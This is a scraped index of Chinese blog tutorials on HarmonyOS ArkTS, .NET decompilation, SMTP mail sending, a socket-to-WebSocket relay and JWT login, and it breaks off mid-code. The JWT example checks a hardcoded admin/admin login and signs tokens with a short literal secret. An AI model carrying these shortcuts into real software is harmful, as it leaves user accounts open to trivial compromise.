Resource\n-\n加载时显示的占位图。仅支持本地图片。\nobjectFit\nImageFit\nCover\n设置图片的缩放类型。\nobjectRepeat\nImageRepeat\nNoRepeat\n设置图片的重复样式。说明：svg类型图源不支持该属性。\ninterpolation\nImageInterpolation\nNone\n设置图片的插值效果，即减轻低清晰度图片在放大显示的时候出现的锯齿问题，仅针对图片放大插值。说明：- svg类型图源不支持该属性。- PixelMap资源不支持该属性。\nrenderMode\nImageRenderMode\nOriginal\n设置图片渲染的模式。说明：svg类型图源不支持该属性。\nsourceSize\n{width: number,height:\nnumber}\n-\n设置图片解码尺寸，将原始图片\n解码成指定尺寸的图片，\nnumber类型单位为px。说明：PixelMap资源和SVG图片不支持该属性。\nmatchTextDirection\nboolean\nfalse\n设置图片是否跟随系统语言方向，在RTL语言环境下显示镜像翻转显示效果。\nfitOriginalSize\nboolean\ntrue\n图片组件尺寸未设置时，其显示尺寸是否跟随图源尺寸。\nfillColor\nResourceColor\n-\n仅对svg图源生效，设置后会替换svg图片的fill颜色。\nautoResize\nboolean\ntrue\n是否需要在图片解码过程中对图源做resize操作，该操作会根据显示区域的尺寸决定用于绘制的图源尺寸，有利于减少内存占用。\nsyncLoad8+\nboolean\nfalse\n设置是否同步加载图片，默认是异步加载。同步加载时阻塞UI线程，不会显示占位图。\nImageInterpolation枚举说明\n名称\n描述\nNone\n不使用插值图片数据。\nHigh\n高度使用插值图片数据，可能会影响图片渲染的速度。\nMedium\n中度使用插值图片数据。\nLow\n低度使用插值图片数据。\nImageRenderMode枚举说明 名称\n描述\nOriginal\n按照原图进行渲染，包括颜色。\nTemplate\n将图像渲染为模板图像，忽略图片的颜色信息。\n事件\n名称\n功能描述\nonComplete(callback: (event?: { width: number, height: number, componentWidth: number,componentHeight: number, loadingStatus: number }) =\u0026gt; void)\n图片成功加载时触发该回调，返回成功加载的图源尺寸。\nonError(callback: (event?: { componentWidth: number, componentHeight: number }) =\u0026gt; void)\n图片加载出现异常时触发该回调。\nonFinish(event: () =\u0026gt; void)\n当加载的源文件为带动效的svg图片时，当svg动效播放完成时会触发这个回调，如果动效为无限循环动效，则不会触发这个回调。\nImage($r(\u0026#39;app.media.icon\u0026#39;)).width(\u0026#39;80vp\u0026#39;) 😴像素单位 像素单位 提供4种像素单位，框架采用vp为基准数据单位。\n名称\n描述\npx\n屏幕物理像素单位。\nvp\n屏幕密度相关像素，根据屏幕像素密度转换为屏幕物理像素，当数值不带单位时，默认单位vp。\nfp\n字体像素，与vp类似适用屏幕密度变化，随系统字体大小设置变化。\nlpx\n视窗逻辑像素单位，lpx单位为实际屏幕宽度与逻辑宽度（通过designWidth配置）的比值。如配置designWidth为720时，在实际宽度为1440物理像素的屏幕上，1lpx为2px大小。\n像素单位转换 提供其他单位与px单位互相转换的方法。\n接口\n描述\nvp2px(value : number) : number\n将vp单位的数值转换为以px为单位的数值。\npx2vp(value : number) : number\n将px单位的数值转换为以vp为单位的数值。\nfp2px(value : number) : number\n将fp单位的数值转换为以px为单位的数值。\npx2fp(value : number) : number\n将px单位的数值转换为以fp为单位的数值。\nlpx2px(value : number) : number\n将lpx单位的数值转换为以px为单位的数值。\npx2lpx(value : number) : number\n将px单位的数值转换为以lpx为单位的数值。\n🛰️预览器 编辑器常用的 真机log 预览器log ​ 预览编辑器 ​ 组件预览 ​\n​\n👉请求后端接口测试 import ohos.net.http\n// test.ets import http from \u0026#39;@ohos.net.http\u0026#39;; export function test(){ // 每一个httpRequest对应一个HTTP请求任务，不可复用 let httpRequest = http.createHttp(); // 用于订阅HTTP响应头，此接口会比request请求先返回。可以根据业务需要订阅此消息 // 从API 8开始，使用on(\u0026#39;headersReceive\u0026#39;, Callback)替代on(\u0026#39;headerReceive\u0026#39;, AsyncCallback)。 8+ httpRequest.on(\u0026#39;headersReceive\u0026#39;, (header) =\u0026gt; { console.info(\u0026#39;header: \u0026#39; + JSON.stringify(header)); }); httpRequest.request( // 填写HTTP请求的URL地址，可以带参数也可以不带参数。URL地址需要开发者自定义。请求的参数可以在extraData中指定 \u0026#34;/api/userApi/RegIMUser\u0026#34;, { method: http.RequestMethod.POST, // 可选，默认为http.RequestMethod.GET // 开发者根据自身业务需要添加header字段 header: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39; }, // 当使用POST请求时此字段用于传递内容 extraData: { \u0026#34;mobile\u0026#34;: \u0026#34;20240419\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;123123\u0026#34;, \u0026#34;ucode\u0026#34;: \u0026#34;666666\u0026#34; }, expectDataType: http.HttpDataType.STRING, // 可选，指定返回数据的类型 usingCache: true, // 可选，默认为true priority: 1, // 可选，默认为1 connectTimeout: 60000, // 可选，默认为60000ms readTimeout: 60000, // 可选，默认为60000ms usingProtocol: http.HttpProtocol.HTTP1_1, // 可选，协议类型默认值由系统自动指定 }, (err, data) =\u0026gt; { if (!err) { // data.result为HTTP响应内容，可根据业务需要进行解析 console.info(\u0026#39;Result:\u0026#39; + JSON.stringify(data.result)); console.info(\u0026#39;code:\u0026#39; + JSON.stringify(data.responseCode)); // data.header为HTTP响应头，可根据业务需要进行解析 console.info(\u0026#39;header:\u0026#39; + JSON.stringify(data.header)); console.info(\u0026#39;cookies:\u0026#39; + JSON.stringify(data.cookies)); // 8+ return JSON.stringify(data.result); } else { console.info(\u0026#39;error:\u0026#39; + JSON.stringify(err)); // 取消订阅HTTP响应头事件 httpRequest.off(\u0026#39;headersReceive\u0026#39;); // 当该请求使用完毕时，调用destroy方法主动销毁 httpRequest.destroy(); return JSON.stringify(err); } } ); } index.ets调用\n// index.ets import {test} from \u0026#39;../Common/Stest\u0026#39; onPageShow() { console.info(\u0026#39;Index onPageShow\u0026#39;); const tests = test(); } 请求结果\n​\nsql查询\n​\nEnd 🦉\n","permalink":"https://qfsyso.github.io/posts/harmonyos-study-arkts/","summary":"💡 环境搭建 HarmonyOS开发环境搭建\nDevEco Studio安装 https://developer.huawei.com/consumer/cn/deveco-studio/\n​\n🚀安装nodejs ​\n🤵安装ohpm ​\n🍔安装SDK ​\n​\n💥Emulator安装 ​\nQ:The graphic card OpenGL version is too old for Previewer to work..\n解决方法分两步：\n1、下载enGL库：https://github.com/pal1000/mesa-dist-win/releases/download/23.1.1/mesa3d-23.1.1-release-msvc.7z\n2、解压下载的zip文件,双击执行systemwidedeploy.cmd文件，然后按任意键，出现一个菜单，选择1，然后开始安装OpenGL驱动，出现complete 后关闭终端，重新运行程序即可生效。\n🌶️新建ArkTs项目 ​\n​\n​\nentry：HarmonyOS工程模块，编译构建生成一个HAP包。\nsrc \u0026gt; main \u0026gt; ets：用于存放ets源码。 src \u0026gt; main \u0026gt; ets \u0026gt; MainAbility：应用/服务的入口。 src \u0026gt; main \u0026gt; ets \u0026gt; MainAbility \u0026gt; pages：MainAbility包含的页面。 src \u0026gt; main \u0026gt; ets \u0026gt; MainAbility \u0026gt; pages \u0026gt; index.ets：pages列表中的第一个页面，即应用的首页入口。 src \u0026gt; main \u0026gt; ets \u0026gt; MainAbility \u0026gt; app.","title":"HarmonyOS Study ArkTS"},{"content":"反编译是对程序进行逆向分析、研究，以推导出软件产品所使用的思路、原理、结构、算法、处理过程、运行方法等设计要素。\n反编译.NET程序需要使用专门的反编译工具\n🧿使用dotPeek进行反编译 1.下载dotPeek dotPeek：JetBrains 出品的免费 .NET 反编译器与程序集浏览器\n​\n2.File \u0026gt; Open\n​\n3.打开需要反编译的文件方法\n​\n🧝‍♂️使用ILSpy进行反编译 下载并安装 ILSpy：https://github.com/icsharpcode/ILSpy/releases 2.文件-打开-exe\n​\n3.查看反编译内容\n找到Form1 可以看到里面反编译的内容\n​\n复制到vs里面\n替换代码添加相关引用即可\n🤖使用Reflector进行反编译 1.File \u0026gt; Open Assembly\n​ ​\n2.点开WinTime.exe内容\n​\n3.查看反编译内容\n可以看到反编译出来的控件和方法 ​\n点开方法，可以看到方法内的内容\n注意：\n反编译的代码可能不完全等同于原始源代码，因为编译器可能会进行优化，并且某些信息可能因为混淆技术而无法恢复。\n","permalink":"https://qfsyso.github.io/posts/.net-%E5%8F%8D%E7%BC%96%E8%AF%91/","summary":"反编译是对程序进行逆向分析、研究，以推导出软件产品所使用的思路、原理、结构、算法、处理过程、运行方法等设计要素。\n反编译.NET程序需要使用专门的反编译工具\n🧿使用dotPeek进行反编译 1.下载dotPeek dotPeek：JetBrains 出品的免费 .NET 反编译器与程序集浏览器\n​\n2.File \u0026gt; Open\n​\n3.打开需要反编译的文件方法\n​\n🧝‍♂️使用ILSpy进行反编译 下载并安装 ILSpy：https://github.com/icsharpcode/ILSpy/releases 2.文件-打开-exe\n​\n3.查看反编译内容\n找到Form1 可以看到里面反编译的内容\n​\n复制到vs里面\n替换代码添加相关引用即可\n🤖使用Reflector进行反编译 1.File \u0026gt; Open Assembly\n​ ​\n2.点开WinTime.exe内容\n​\n3.查看反编译内容\n可以看到反编译出来的控件和方法 ​\n点开方法，可以看到方法内的内容\n注意：\n反编译的代码可能不完全等同于原始源代码，因为编译器可能会进行优化，并且某些信息可能因为混淆技术而无法恢复。","title":" .NET 反编译"},{"content":"SMTP（Simple Mail Transfer Protocol）是用于电子邮件传输的规则集，可以从邮件客户端向接收电子邮件服务器发送、中继或转发邮件。发件人可使用SMTP 服务器来执行发送电子邮件的过程。SMTP服务器则是按照这些规则中转电子邮件的服务器。\nIMAP可以理解为收邮件。 ​\n🐧使用QQ邮箱发邮件 首先需要设置开启邮箱的SMTP服务\n登录(https://mail.qq.com/)电脑网页版邮箱进入【设置】-\u0026gt;【帐户】-\u0026gt;【POP3/IMAP/SMTP服务】， 开启或关闭相应服务最后保存更改即可。 ​\nQQ邮箱 POP3 和 SMTP 服务器地址设置如下：\n邮箱\tPOP3服务器（端口995）\tSMTP服务器（端口465或587） qq.com\tpop.qq.com\tsmtp.qq.com SMTP服务器需要身份验证。\n以下是示例代码：\nusing ConsoleApp1Test; //xxx string server = \u0026#34;smtp.qq.com\u0026#34;; string username = \u0026#34;my test email\u0026#34;; string password = \u0026#34;xxx; string from = \u0026#34;from@qq.com\u0026#34;; string to = \u0026#34;to@qq.com\u0026#34;; string subject = \u0026#34;Test Email\u0026#34;; string content = \u0026#34;This is a test email sent asynchronously.\u0026#34;; bool isHtml = false; // 是否为 HTML 格式 try { bool success = await MailHelper. SendMailAsync(server, username, password, from, to, null, subject, content, isHtml); if (success) { Console.WriteLine(\u0026#34;邮件发送成功！\u0026#34;); } else { Console.WriteLine(\u0026#34;邮件发送失败！\u0026#34;); } } catch (Exception ex) { Console.WriteLine($\u0026#34;邮件发送出错：{ex.Message}\u0026#34;); } using System; using System.Collections.Generic; using System.Linq; using System.Net.Mail; using System.Text; using System.Threading.Tasks; namespace ConsoleApp1Test { internal class MailHelper { public static async Task\u0026lt;bool\u0026gt; SendMailAsync(string server, string username, string password, string from, string to, string cc, string subject, string content, bool isHtml) { try { using (var smtp = new SmtpClient(server)) { smtp.UseDefaultCredentials = false; smtp.Credentials = new System.Net.NetworkCredential(username, password); smtp.EnableSsl = true; // 启用加密 smtp.DeliveryMethod = SmtpDeliveryMethod.Network; using (var mail = new MailMessage()) { mail.From = new MailAddress(from); mail.To.Add(to); mail.SubjectEncoding = Encoding.UTF8; mail.Subject = subject; mail.IsBodyHtml = isHtml; mail.BodyEncoding = Encoding.UTF8; mail.Body = content; await smtp.SendMailAsync(mail); // 异步发送邮件 } return true; } } catch (Exception err) { // 发送失败时的异常处理 // 可以在此处记录日志 return false; } } } } ​ ​\n🐷使用网易邮箱发送邮件 163网易免费邮\n设置 \u0026gt; POP3/SMTP/IMAP\n​ ​\n使用网易邮箱发送邮件上述示例类似，只需替换相应的服务器地址、用户名、密码、发件人、收件人、主题、内容等信息即可。\nstring server = \u0026#34;smtp.163.com\u0026#34;; string username = \u0026#34;f@163.com\u0026#34;; string password = \u0026#34;xxx\u0026#34;; string from = \u0026#34;f@163.com\u0026#34;; string to = \u0026#34;t@qq.com\u0026#34;; string subject = \u0026#34;Test163Email m\u0026#34;; string content = \u0026#34;This is a test email \u0026#34;; bool isHtml = false; // 是否为 HTML 格式 ``` c# 运行： ​\u0026lt;img onerror=\u0026#34;notfound(this);\u0026#34; src=\u0026#34;https://cdn.jsdelivr.net/gh/qfsysw/resources/v2/20240420aaa07.jpg\u0026#34;\u0026gt; ​\u0026lt;img onerror=\u0026#34;notfound(this);\u0026#34; src=\u0026#34;https://cdn.jsdelivr.net/gh/qfsysw/resources/v2/20240420aaa08.jpg\u0026#34;\u0026gt; ​\u0026lt;img onerror=\u0026#34;notfound(this);\u0026#34; src=\u0026#34;https://cdn.jsdelivr.net/gh/qfsysw/resources/v2/20240420aaa09.jpg\u0026#34;\u0026gt; # 🐬使用谷歌邮箱发送邮件 谷歌Gmail邮箱登陆地址：https://mail.google.com ​\u0026lt;img onerror=\u0026#34;notfound(this);\u0026#34; src=\u0026#34;https://cdn.jsdelivr.net/gh/qfsysw/resources/v2/20240420aaa10.jpg\u0026#34;\u0026gt; ​\u0026lt;img onerror=\u0026#34;notfound(this);\u0026#34; src=\u0026#34;https://cdn.jsdelivr.net/gh/qfsysw/resources/v2/20240420aaa11.jpg\u0026#34;\u0026gt; 谷歌imap开通 smtp也自动开通 https://myaccount.google.com/ ​\u0026lt;img onerror=\u0026#34;notfound(this);\u0026#34; src=\u0026#34;https://cdn.jsdelivr.net/gh/qfsysw/resources/v2/20240420aaa12.jpg\u0026#34;\u0026gt; ​\u0026lt;img onerror=\u0026#34;notfound(this);\u0026#34; src=\u0026#34;https://cdn.jsdelivr.net/gh/qfsysw/resources/v2/20240420aaa13.jpg\u0026#34;\u0026gt; 接收邮件 (IMAP) 服务器\timap.gmail.com要求 SSL：是端口：993 发送邮件 (SMTP) 服务器\tsmtp.gmail.com要求 SSL：是要求 TLS：是（如适用）使用身份验证：是SSL 端口：465TLS/STARTTLS 端口：587 使用谷歌邮箱修改对应的服务器地址、用户名、密码、发件人、收件人、主题、内容等信息即可。 ``` c# string server = \u0026#34;smtp.gmail.com\u0026#34;; string username = \u0026#34;f@gmail.com\u0026#34;; string password = \u0026#34;xx\u0026#34;; string from = \u0026#34;f@gmail.com\u0026#34;; string to = \u0026#34;t@qq.com\u0026#34;; string subject = \u0026#34;TestSMTPEmail m\u0026#34;; string content = \u0026#34;This is a test email sent using Gmail SMTP.m\u0026#34;; bool isHtml = false; // 是否为 HTML 格式 运行：\n​ ​\n📮有些免费邮箱对发信量有限制，可使用企业邮，多账号增加发信量。\nEND\n","permalink":"https://qfsyso.github.io/posts/.net-smtp/","summary":"SMTP（Simple Mail Transfer Protocol）是用于电子邮件传输的规则集，可以从邮件客户端向接收电子邮件服务器发送、中继或转发邮件。发件人可使用SMTP 服务器来执行发送电子邮件的过程。SMTP服务器则是按照这些规则中转电子邮件的服务器。\nIMAP可以理解为收邮件。 ​\n🐧使用QQ邮箱发邮件 首先需要设置开启邮箱的SMTP服务\n登录(https://mail.qq.com/)电脑网页版邮箱进入【设置】-\u0026gt;【帐户】-\u0026gt;【POP3/IMAP/SMTP服务】， 开启或关闭相应服务最后保存更改即可。 ​\nQQ邮箱 POP3 和 SMTP 服务器地址设置如下：\n邮箱\tPOP3服务器（端口995）\tSMTP服务器（端口465或587） qq.com\tpop.qq.com\tsmtp.qq.com SMTP服务器需要身份验证。\n以下是示例代码：\nusing ConsoleApp1Test; //xxx string server = \u0026#34;smtp.qq.com\u0026#34;; string username = \u0026#34;my test email\u0026#34;; string password = \u0026#34;xxx; string from = \u0026#34;from@qq.com\u0026#34;; string to = \u0026#34;to@qq.com\u0026#34;; string subject = \u0026#34;Test Email\u0026#34;; string content = \u0026#34;This is a test email sent asynchronously.\u0026#34;; bool isHtml = false; // 是否为 HTML 格式 try { bool success = await MailHelper.","title":" .NET SMTP"},{"content":"前言 针对IOS App Proxy Server无法直连WebSocket，建立 Socket中转端。\n​\nWebSocket 端：\nWebSocket 端用于实现实时通信功能。\nWebSocket 端通过 WebSocket 协议与中转端通信，中转端可以通过 WebSocket 或其他传输协议与 WebSocket 端建立连接，收发消息。\n定义 SendMessageToChatRoomIP 和 JoinChatRoom，用于处理来自客户端的消息和连接事件。\n中转端 C1 （Socket Server）：\n中转端 C1 是一个独立的应用程序，用于连接WebSocket端，建立Socket服务。\n中转端 C1 的主要功能是接收来自客户端 C2 的消息，并将其转发给 WebSocket 端，或者接收来自 WebSocket 端的消息，并转发给客户端 C2。\n客户端 C2 x N ：\n客户端 C2 ，主要与中转端连接 发送数据，接收数据。\n在客户端 C2 中，连接到中转端 C1、发送消息给中转端 C1、接收来自中转端 C1 的消息。\n调用关系为：\n客户端 C2 通过与中转端 C1 的通信，向 WebSocket 端发送消息或接收来自 WebSocket 端的消息。\n中转端 C1 接收来自客户端 C2 的消息，并将其转发给 WebSocket 端，或者接收来自 WebSocket 端的消息，并转发给客户端 C2。\n​\n中转端实现 1.连接WebSocket public async Task ConnectToServer() { try { connection = new HubConnectionBuilder() .WithUrl(\u0026#34;xxx/chathub\u0026#34;)// .Build(); connection.On\u0026lt;string, string, string, string\u0026gt;(\u0026#34;ReceiveMessage\u0026#34;, async (user, message, clientIP, chatRoomId) =\u0026gt; { Console.WriteLine($\u0026#34;Received message from wsserver_sr : {user}: {message} |socketserver {clientIP}|{chatRoomId}\u0026#34;); // 收到来自服务器的消息时，向客户端 C2 发送消息 await SendMessageToClientC2(user, message, clientIP, chatRoomId); }); await connection.StartAsync(); } catch (Exception ex) { Console.WriteLine($\u0026#34;Error connecting to SignalR server: {ex.Message}\u0026#34; + Environment.NewLine); } } 收到消息时发送给对应客户端\npublic async Task SendMessageToClientC2(string user, string message, string clientIP, string chatRoomId) { // 根据 chatRoomId 找到对应的客户端 C2，并发送消息 if (chatRooms.ContainsKey(chatRoomId)) { byte[] data = Encoding.ASCII.GetBytes($\u0026#34;{user} {message} |{clientIP}|{chatRoomId} \u0026#34;); foreach (var client in chatRooms[chatRoomId]) { await client.GetStream().WriteAsync(data, 0, data.Length); } } else { Console.WriteLine($\u0026#34;Chat room {chatRoomId} does not exist\u0026#34; + Environment.NewLine); } } 2.建立中转端Socket端口 public void StartListening() { if (!listening) { try { int port = 10086; // 监听端口 server = new TcpListener(IPAddress.Any, port); server.Start(); listening = true; Console.WriteLine($\u0026#34;Server listening on port {port}\u0026#34; + Environment.NewLine); Task.Run(() =\u0026gt; AcceptClients()); } catch (Exception ex) { Console.WriteLine($\u0026#34;Error starting server: {ex.Message}\u0026#34; + Environment.NewLine); } } } 3.向客户端发消息 public async Task AcceptClients() { while (listening) { try { TcpClient client = await server.AcceptTcpClientAsync(); Task.Run(() =\u0026gt; HandleClient(client)); } catch (Exception ex) { Console.WriteLine($\u0026#34;Error accepting client: {ex.Message}\u0026#34; + Environment.NewLine); } } } 4.监听客户端连接 public async Task AcceptClients() { while (listening) { try { TcpClient client = await server.AcceptTcpClientAsync(); Task.Run(() =\u0026gt; HandleClient(client)); } catch (Exception ex) { Console.WriteLine($\u0026#34;Error accepting client: {ex.Message}\u0026#34; + Environment.NewLine); } } } 5.处理客户端连接 public async Task HandleClient(TcpClient client) { NetworkStream stream = client.GetStream(); byte[] buffer = new byte[1024]; int bytesRead; while (client.Connected) { try { bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length); string message = Encoding.ASCII.GetString(buffer, 0, bytesRead); ProcessMessage(message, client); } catch (Exception ex) { Console.WriteLine($\u0026#34;Error receiving message: {ex.Message}\u0026#34; + Environment.NewLine); break; } } // 客户端断开连接时，从聊天室中移除 foreach (var chatRoomId in chatRooms.Keys) { if (chatRooms[chatRoomId].Contains(client)) { chatRooms[chatRoomId].Remove(client); Console.WriteLine($\u0026#34;Client disconnected from chat room {chatRoomId}\u0026#34; + Environment.NewLine); break; } } } 6.处理连接 public async void ProcessMessage(string message, TcpClient client) { string[] parts = message.Split(\u0026#39;|\u0026#39;); if (parts.Length \u0026gt;= 2) { string command = parts[0]; string chatRoomId = parts[1]; switch (command) { case \u0026#34;JoinChatRoom\u0026#34;: await JoinChatRoom(chatRoomId, client); break; case \u0026#34;SendMessageToChatRoomIP2\u0026#34;: if (parts.Length \u0026gt;= 4) { string user = parts[2]; string msg = parts[3]; // await SendMessageToChatRoom(chatRoomId, user, msg); await SendMessageToChatRoomAddress(chatRoomId, user, msg, client); } break; default: Console.WriteLine($\u0026#34;Invalid command: {command}\u0026#34; + Environment.NewLine); break; } } } JoinChatRoom 异步调用服务端的JoinChatRoom\nSendMessageToChatRoomIP2 异步调用SendMessage\n7.运行 本地运行 ​\n发布到linux ​\nrun Server listening on port 10860\nnetstat -tln查看端口 （tuln） 也可以优化封装成WinForm程序，收发消息可视化。\n点击启动socket端口调用 1.连接websocket 2.监听socket\n​\n也可以封装成系统服务，与进程一样藏在后台运行。\n客户端实现 1.连接Socket端 private async void MainForm_Load(object sender, EventArgs e) { try { client = new TcpClient(); await client.ConnectAsync(\u0026#34;192.168.80.123\u0026#34;, 10086); stream = client.GetStream(); connected = true; // 连接成功后，调用 JoinChatRoom 方法加入聊天室 await JoinChatRoom(\u0026#34;room001\u0026#34;); Task.Run(ReceiveMessages); } catch (Exception ex) { textBoxReceivedMessages.AppendText($\u0026#34;Error connecting to server: {ex.Message}\u0026#34; + Environment.NewLine); } } 2.加入ChatRoom JoinChatRoom中转到Server端再加入聊天室\nprivate async Task JoinChatRoom(string chatRoomId) { // 发送消息给中转端 C1，请求加入聊天室 byte[] data = Encoding.ASCII.GetBytes($\u0026#34;JoinChatRoom|{chatRoomId}|J\u0026#34;); await stream.WriteAsync(data, 0, data.Length); } ``` # 3.发送消息 发送到Socket中转端 ``` c# private async Task SendMessageToChatRoom(string chatRoomId, string message) { // 发送消息给中转端 C1，请求向指定聊天室发送消息 byte[] data = Encoding.ASCII.GetBytes($\u0026#34;SendMessageToChatRoomIP2|{chatRoomId}|client2m|{message}\u0026#34;); await stream.WriteAsync(data, 0, data.Length); } 4.接收消息 private async Task ReceiveMessages() { byte[] buffer = new byte[1024]; int bytesRead; while (connected) { try { bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length); string message = Encoding.ASCII.GetString(buffer, 0, bytesRead); DisplayMessage(message); } catch (Exception ex) { textBoxReceivedMessages.AppendText($\u0026#34;Error receiving message: {ex.Message}\u0026#34; + Environment.NewLine); } } } private void DisplayMessage(string message) { if (InvokeRequired) { Invoke(new Action\u0026lt;string\u0026gt;(DisplayMessage), message); return; } textBoxReceivedMessages.AppendText(message + Environment.NewLine); } 5.点击事件 Send\nprivate async void buttonSend_Click(object sender, EventArgs e) { if (!connected) { textBoxReceivedMessages.AppendText(\u0026#34;Not connected to server.\u0026#34; + Environment.NewLine); return; } string message = textBoxSendMessage.Text; if (!string.IsNullOrEmpty(message)) { // 发送消息给中转端 C1，请求向聊天室发送消息 await SendMessageToChatRoom(\u0026#34;room001\u0026#34;, message); textBoxSendMessage.Clear(); textBoxReceivedMessages.AppendText(\u0026#34;Sent message to chat room: room001\u0026#34; + Environment.NewLine); } else { textBoxReceivedMessages.AppendText(\u0026#34;Please enter a message.\u0026#34; + Environment.NewLine); } } 6.运行 ​\n服务端启动\nServer listening on port 10086\n服务端发收发消息到中转端\nSent message to chat room: room001 client2m hihihi|socketclient 192.168.80.123 |::ffff:183.7.113.105|room001\n中转端拿到客户端信息-\u0026gt;WebSocket端-\u0026gt;中转端接收-\u0026gt;客户端接收\nClient joined chat room room001 Received message from WSSserver_sr : client2m: hihihi|socketclient 192.168.80.123 |socketserver:::ffff:183.7.113.105|room001\n客户端也可以用IOS SOCKET5发送消息\n//... dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{ NSData * sendData = [@\u0026#34;JoinChatRoom|room001\u0026#34; dataUsingEncoding:NSUTF8StringEncoding]; [self.socket writeData:sendData withTimeout:-1 tag:1]; dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{ NSData * sendData = [@\u0026#34;SendMessageToChatRoomIP2|room001|userid001|hello\u0026#34; dataUsingEncoding:NSUTF8StringEncoding]; [self.socket writeData:sendData withTimeout:-1 tag:2]; [self.socket readDataWithTimeout:-1 tag:1]; }); }); //... Run\n​\n","permalink":"https://qfsyso.github.io/posts/socket-to-websocket/","summary":"前言 针对IOS App Proxy Server无法直连WebSocket，建立 Socket中转端。\n​\nWebSocket 端：\nWebSocket 端用于实现实时通信功能。\nWebSocket 端通过 WebSocket 协议与中转端通信，中转端可以通过 WebSocket 或其他传输协议与 WebSocket 端建立连接，收发消息。\n定义 SendMessageToChatRoomIP 和 JoinChatRoom，用于处理来自客户端的消息和连接事件。\n中转端 C1 （Socket Server）：\n中转端 C1 是一个独立的应用程序，用于连接WebSocket端，建立Socket服务。\n中转端 C1 的主要功能是接收来自客户端 C2 的消息，并将其转发给 WebSocket 端，或者接收来自 WebSocket 端的消息，并转发给客户端 C2。\n客户端 C2 x N ：\n客户端 C2 ，主要与中转端连接 发送数据，接收数据。\n在客户端 C2 中，连接到中转端 C1、发送消息给中转端 C1、接收来自中转端 C1 的消息。\n调用关系为：\n客户端 C2 通过与中转端 C1 的通信，向 WebSocket 端发送消息或接收来自 WebSocket 端的消息。\n中转端 C1 接收来自客户端 C2 的消息，并将其转发给 WebSocket 端，或者接收来自 WebSocket 端的消息，并转发给客户端 C2。","title":"Socket to WebSocket"},{"content":"前言\nJWT (JSON Web Token) 是一种安全传输信息的开放标准，由Header、Payload和Signature三部分组成。它主要用于身份验证、信息交换和授权。JWT可验证用户身份，确保访问权限，实现单点登录，并在客户端和服务器之间安全地交换信息。因其简单、安全和便捷，JWT在现代Web应用中广泛使用。\n用JWT有多个原因：\n无状态的身份验证：JWT允许服务器无需保存用户的会话信息，因为所有必要的信息都存储在令牌本身中。这降低了服务器的存储需求，并提高了系统的可扩展性。\n跨域身份验证：由于JWT是自我包含的，并且可以被轻松传递，因此它非常适合跨域身份验证。用户可以在一个服务上验证身份，然后使用相同的令牌访问另一个服务，从而实现单点登录（SSO）。\n安全性：JWT可以通过使用强大的加密算法（如HS256, RS256等）进行签名，以确保其完整性和真实性。服务器可以使用公钥验证令牌的签名，从而确保它没有被篡改，并且确实是由受信任的颁发者签发的。\n减少数据库查询：由于用户的身份信息都存储在JWT中，服务器无需每次都去数据库中查询用户的身份信息，从而减少了数据库的压力和查询时间。\n可定制性：JWT的Payload部分可以包含自定义的信息，如用户角色、权限等，这使得JWT非常灵活，并可以根据具体需求进行定制。\n易于分发和共享：JWT可以轻松地通过网络传输，并且可以在多个服务和客户端之间共享，这使得它在微服务架构和分布式系统中非常有用。\n标准化和互操作性：JWT是一个开放标准（RFC 7519），这意味着不同的系统和语言都可以使用相同的方式生成和验证JWT，从而提高了系统的互操作性。\n环境 Win10 VS2022 .NET8\n✨ 建立项目jwttest 1.创建TestJwtController ​\n2.下载JWT ​\n3.建实体类 /// \u0026lt;summary\u0026gt; /// 用户信息类 /// \u0026lt;/summary\u0026gt; public class LoginRs { /// \u0026lt;summary\u0026gt; /// 用户ID /// \u0026lt;/summary\u0026gt; public string UserId { get; set; } /// \u0026lt;summary\u0026gt; /// 用户密码 /// \u0026lt;/summary\u0026gt; public string PasswordMD5 { get; set; } } /// \u0026lt;summary\u0026gt; /// 用户登录信息类 /// \u0026lt;/summary\u0026gt; public class LoginInfo { /// \u0026lt;summary\u0026gt; /// 用户信息 /// \u0026lt;/summary\u0026gt; public string UserId { get; set; } /// \u0026lt;summary\u0026gt; /// 检验时间 /// \u0026lt;/summary\u0026gt; public DateTime Expires { get; set; } } /// \u0026lt;summary\u0026gt; /// rsmodel /// \u0026lt;/summary\u0026gt; public class RsModel { /// \u0026lt;summary\u0026gt; /// 是否成功 /// \u0026lt;/summary\u0026gt; public bool isOk { get; set; } /// \u0026lt;summary\u0026gt; /// 返回值 /// \u0026lt;/summary\u0026gt; public int code { get; set; } /// \u0026lt;summary\u0026gt; /// 返回消息 /// \u0026lt;/summary\u0026gt; public string msg { get; set; } /// \u0026lt;summary\u0026gt; /// 返回数据 /// \u0026lt;/summary\u0026gt; public object rsData { get; set; } } 4.添加post login // POST api/\u0026lt;ValuesController\u0026gt; [HttpPost] public string Login([FromBody] LoginRs loginRequest) { if (loginRequest == null) return JsonConvert.SerializeObject(new RsModel() { code = 0, isOk = false, msg = \u0026#34;登录信息为空！\u0026#34; }); #region 判断userid pwd if (loginRequest.UserId != \u0026#34;admin\u0026#34; || loginRequest.PasswordMD5 != \u0026#34;admin\u0026#34;) { return JsonConvert.SerializeObject(new RsModel() { code = 0, isOk = false, msg = \u0026#34;用户名和密码不正确！\u0026#34; }); } #endregion LoginInfo Info = new LoginInfo() { UserId = loginRequest.UserId, Expires = DateTime.Now.AddDays(1) }; const string secretKey = \u0026#34;myseckey\u0026#34;;//口令加密秘钥 byte[] key = Encoding.UTF8.GetBytes(secretKey); IJwtAlgorithm algorithm = new HMACSHA256Algorithm();//加密方式 IJsonSerializer serializer = new JsonNetSerializer();//序列化Json IBase64UrlEncoder urlEncoder = new JwtBase64UrlEncoder();//base64加解密 IJwtEncoder encoder = new JwtEncoder(algorithm, serializer, urlEncoder);//JWT编码 var token = encoder.Encode(Info, key);//生成令牌 return JsonConvert.SerializeObject(new RsModel() { code = 1, isOk = true, rsData = token, msg = \u0026#34;登录成功！\u0026#34; }); } ​\n5.登录验证 这里使用swagger方便检验 👉 .NET MVC API Swagger入坑\n​\n6.测试没问题，写个JwtHelper public static class JwtHelper { private static readonly string JwtKey = \u0026#34;mysecret\u0026#34;; /// \u0026lt;summary\u0026gt; /// 获取加密解密 /// \u0026lt;/summary\u0026gt; /// 